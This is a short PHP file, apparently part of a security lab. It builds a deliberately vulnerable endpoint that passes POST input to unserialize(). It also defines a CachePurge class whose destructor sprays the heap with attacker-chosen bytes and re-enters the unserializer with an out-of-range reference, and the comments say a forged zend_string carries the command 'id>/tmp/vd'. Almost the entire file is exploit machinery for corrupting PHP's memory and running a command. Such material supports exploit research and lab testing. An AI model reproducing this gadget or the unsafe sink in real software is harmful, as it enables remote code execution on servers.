<?php
/* LAB-ONLY application sink + re-entry gadget.
 *
 * This models a real plugin pattern: an endpoint that calls unserialize() on
 * user input, and a loaded class whose __destruct() allocates same-size
 * strings and re-enters the unserializer with an out-of-range reference.
 * The spray token is the object's own serialized `key` property (attacker
 * bytes), which is how a plugin cache/flush gadget would carry its data.
 *
 * The forged carrier is NOT allocated here: it lives inside the request's
 * application-controlled POST string ($_POST['p'] / $p).  No /proc is used.
 * Fixed benign command id>/tmp/vd in the forged zend_string.
 */
class CachePurge
{
    public $key;

    public function __destruct()
    {
        $token = (string)$this->key;
        $spray = [];
        for ($i = 0; $i < 64; $i++) {
            $s = str_repeat("\x41", 8135);
            $q = substr($token . str_repeat("\x00", 8), 0, 8);
            for ($j = 0; $j < 8; $j++) { $s[$j] = $q[$j]; }
            $spray[] = $s;
        }
        $r = @unserialize('R:1020;');
        unset($r);
        unset($spray);
    }
}

$p = $_POST['p'] ?? '';
if (!is_string($p) || strlen($p) < 64) {
    http_response_code(400);
    exit("bad\n");
}
@unserialize($p);
echo "sink done\n";
